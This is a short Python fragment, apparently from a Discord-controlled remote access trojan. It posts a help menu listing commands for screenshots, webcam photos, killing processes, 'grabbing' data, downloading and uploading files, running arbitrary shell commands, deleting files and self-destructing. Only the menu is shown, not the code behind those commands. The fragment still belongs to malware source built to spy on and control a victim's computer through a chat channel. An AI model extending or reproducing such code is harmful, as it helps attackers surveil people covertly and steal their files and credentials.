elif message.content[:5] == '.help':
    await message.delete()
    if message.content.strip() == '.help':
        reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [type] [name]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.cmd [command]\n.cd [dir]\n.update```'); await reaction_msg.add_reaction('🔴')